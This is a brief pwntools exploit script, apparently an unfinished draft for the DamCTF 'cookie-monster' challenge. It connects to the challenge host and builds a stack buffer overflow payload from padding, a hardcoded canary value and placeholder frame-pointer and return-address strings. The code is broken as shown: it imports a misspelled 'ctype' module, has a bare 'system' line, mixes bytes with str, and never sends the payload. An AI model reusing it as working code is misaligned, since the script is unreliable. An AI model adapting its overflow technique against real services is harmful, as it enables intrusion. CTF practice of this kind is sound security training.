from pwn import *
from ctype import *
import os
import time



# nc chals.damctf.xyz 31312


# network connect

p = remote("chals.damctf.xyz", 31312)
context.log_level = "debug"
libc = cdll.LoadLibrary('libc.so.6')

print(p.recv())
p.sendline(b'anthony')
print(p.recv())

# what would like to purchase
#  lea    eax,[ebp-0x2c]
cookie = 0xb96cf700
system
buf = b'a' * 0x20 + p32(cookie) + b'b' * (0xc - 8) + 'sebp' + 'ret_'

p.interactive()

# binary connect

# p = process('./cookie-monster')

# print(p.recvline())

# p.interactive()